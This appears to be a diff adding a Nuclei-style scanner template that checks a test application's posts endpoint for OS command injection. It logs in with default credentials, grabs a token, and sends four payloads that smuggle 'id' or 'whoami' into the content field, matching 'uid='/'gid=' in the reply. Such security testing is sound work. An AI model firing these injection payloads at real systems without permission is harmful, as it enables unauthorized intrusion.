@@ -1,0 +1,50 @@
+id: vuln-sns-posts-command-injection
+info:
+  name: Vuln SNS Posts - OS Command Injection
+  author: claude
+  severity: critical
+  description: |
+    Tests for OS command injection vulnerabilities in posts content.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+  tags: vuln-sns,rce,command-injection,posts
+
+http:
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"user_id":"alice","password":"alice"}
+        
+      - |
+        POST /api/posts HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{token}}
+        
+        {"content":"{{payload}}"}
+
+    payloads:
+      payload:
+        - "test;id"
+        - "test|whoami"
+        - "test`id`"
+        - "test$(whoami)"
+
+    extractors:
+      - type: regex
+        name: token
+        regex:
+          - '"token":\s*"([^"]+)"'
+        part: body_1
+        internal: true
+
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+        condition: and
+        part: body_2
